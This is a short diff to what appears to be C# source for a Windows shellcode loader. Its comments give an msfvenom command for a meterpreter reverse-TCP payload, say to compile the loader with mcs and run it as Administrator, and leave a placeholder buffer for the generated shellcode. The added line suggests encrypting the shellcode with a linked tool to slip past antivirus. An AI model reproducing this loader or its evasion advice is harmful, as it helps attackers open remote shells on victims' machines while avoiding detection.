@@ -57,6 +57,7 @@ dwCreationFlags, IntPtr lpThreadId);
             //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Local Host> LPORT=<LocalPortToListenOn> -f csharp
 	     //Compile on your linux machine using mcs: mcs sourcecode.cs ,it will output: sourcecode.exe, run the Sourcecode.exe as Administrator
 	    //don't forget to target the architecture because it can be a bit tricky
+	    //to bypass AntiVirus you can Encode your ShellCode Using https://github.com/yashmundra/Shellcode-Encryption ,as an example, this might help bypassing some //antiviruses
             byte[] buf = new byte[324] {YOUR-SHELL-CODE-GENERATED FROM MSFVENOM};
 
             IntPtr outSize;
